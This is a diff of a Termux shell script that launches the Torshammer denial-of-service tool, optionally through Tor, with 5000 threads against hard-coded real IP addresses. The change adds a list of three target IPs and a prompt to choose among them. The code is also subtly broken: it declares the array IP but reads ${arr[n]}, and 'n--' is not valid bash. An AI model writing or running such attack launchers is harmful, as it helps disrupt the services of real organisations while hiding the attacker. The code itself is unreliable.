@@ -2,6 +2,8 @@
 
 termux-wake-lock
 
+declare -a IP=("14.139.187.132" "117.240.224.6" "103.5.112.83")
+
 sh ~amrita/update_saphira.sh;
 
 clear;
@@ -40,13 +42,19 @@ fi
 #This is to run Torshammer in Tor
 if [ $var -eq 1 ]
 then
-	python2  ~/torshammer/torshammer.py -t 14.139.187.132 -r 5000 -T
+	echo "Choose IP. Valid Choice btw 1 & 3"
+	read n
+	n--
+	python2  ~/torshammer/torshammer.py -t ${arr[n]} -r 5000 -T
 fi
 
 #This is to run Torshammer without Tor
 if [ $var -eq 0 ]
 then
-	python2  ~/torshammer/torshammer.py -t 14.139.187.132 -r 5000
+	echo "Choose IP. Valid Choice btw 1 & 3"
+	read n
+	n--
+	python2  ~/torshammer/torshammer.py -t ${arr[n]} -r 5000
 fi
 
 termux-wake-unlock
